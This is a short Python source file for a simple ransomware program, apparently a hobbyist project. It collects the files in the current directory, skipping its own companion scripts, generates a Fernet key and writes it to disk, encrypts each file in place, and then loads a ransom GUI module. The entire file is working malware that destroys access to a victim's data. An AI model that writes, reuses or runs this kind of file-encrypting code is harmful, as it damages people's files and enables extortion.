import os
#Fernet is a encrytption method
from cryptography.fernet import Fernet
from tkinter import *
from PIL import ImageTk,Image

#find the files

files = []
#[] is an empty list

#add files to the list
for file in os.listdir():
    if file == "Ranasomeware.py" or file == "TheKey.key" or file == "decrypt.py" or file == "Guiransome.py" or file =="hacker.png" or file =="Guidecrtpy.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("TheKey.key","wb") as thekey:
    thekey.write(key)

#Open file and read, use key to encrypt, write back to file
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

import Guiransome



